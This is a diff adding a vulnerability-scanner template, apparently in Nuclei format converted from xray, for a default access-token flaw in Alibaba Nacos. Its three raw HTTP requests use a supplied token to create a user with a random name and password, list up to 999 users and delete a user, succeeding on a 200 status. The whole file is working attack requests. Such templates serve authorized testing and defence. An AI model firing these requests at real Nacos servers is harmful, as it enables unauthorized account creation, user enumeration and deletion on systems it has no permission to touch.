@@ -1,0 +1,39 @@
+id: poc-yaml-alibaba-nacos-default-token-idor
+
+info:
+  name: poc-yaml-alibaba-nacos-default-token-idor
+  author: d4rksec
+  severity: high
+  tags: xray-converted
+
+http:
+  - raw:
+      - |
+        POST /{{nacosPath}}/auth/users/?username={{rand_base(8)}}&password={{rand_base(8)}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{nacosPath}}/auth/users/?pageNo=1&pageSize=999&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        DELETE /{{nacosPath}}/auth/users/?username={{rand_base(8)}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
